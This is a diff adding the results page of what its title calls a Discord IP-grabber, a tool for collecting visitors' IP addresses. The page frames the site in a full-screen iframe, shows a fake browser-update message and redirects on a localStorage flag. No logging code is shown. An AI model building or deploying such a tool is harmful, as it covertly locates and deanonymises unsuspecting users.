@@ -1,0 +1,39 @@
+<html>
+    <head>
+        <title>
+            Results - Discord IP-Grabber
+        </title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="https://pnghq.com/wp-content/uploads/pnghq.com-discords-bring-guideline-2-350x350.png">
+        
+        <script>
+            localStorage.setItem('error','0')
+        </script>
+    </head>
+    <body>
+        <iframe src="/">
+            Ups, there went something wrong!
+            <br>Try to Update your Browser.
+        </iframe>
+        <style>
+            iframe{
+                position:fixed;
+                top:0;
+                left:0;
+                height:100%;
+                width:100%;
+                padding:0;
+                margin:0;
+                border:none;
+            }
+        </style>
+        <script>
+            setInterval(function(){
+            if(localStorage.getItem('finished_timeout') == '1'){
+              localStorage.clear()
+              location.href = "/";
+            }
+            },100);
+        </script>
+    </body>
+</html>
